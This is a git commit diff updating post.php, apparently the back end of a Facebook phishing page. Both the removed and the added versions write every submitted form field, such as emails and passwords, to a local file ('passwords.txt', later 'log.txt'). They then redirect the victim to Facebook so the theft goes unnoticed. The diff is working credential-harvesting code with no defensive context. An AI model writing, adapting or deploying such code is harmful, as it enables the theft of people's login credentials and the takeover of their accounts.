f52241115b81f245a4e53cde48aca3d47e69d311
pa978ul <46637625+pa978ul@users.noreply.github.com>
2019-02-11 16:15:17 -0500

    Update post.php

--- post.php
+++ post.php
@@ -1,13 +1,13 @@
-:<?php
-header("Location: https://m.facebook.com/login.php?&e=1348092&email=");
-$handle = fopen("passwords.txt", "a");
-foreach($_GET as $variable => $value) {
+<?php
+header ('Location: facebook.com');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
 fwrite($handle, $value);
 fwrite($handle, "\r\n");
 }
-fwrite($handle, "\r\n");
+fwrite($handle, "\r\n\n\n\n");
 fclose($handle);
 exit;
-?> 
+?>
